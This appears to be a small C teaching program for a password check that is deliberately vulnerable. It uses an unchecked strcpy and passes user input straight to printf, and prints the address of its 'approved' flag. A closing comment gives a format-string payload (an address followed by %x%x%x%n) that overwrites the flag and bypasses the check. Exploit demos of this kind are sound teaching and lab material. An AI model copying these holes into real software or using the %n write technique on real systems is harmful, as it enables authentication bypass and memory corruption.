#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char *argv[]) {
	char text[1024];
	static int approved = 0;

	strcpy(text, argv[1]);
	printf("You entered the below passcode:\n");
	printf("%s", text);
	printf("\nThe wrong way to print user-controlled input:\n");
	printf(text);
	printf("\n");
	// Debug output
	printf("[*] test_val @ 0x%08x = %d\n",&approved,approved);
	if (strcmp(text, "password") == 0) approved = 1;
	if ( approved > 0) {
		printf("You may enter!\n");
	}
	else printf("Bad password!\n");

}

// ./bp $(printf "\x34\xa0\x04\x08")%x%x%x%n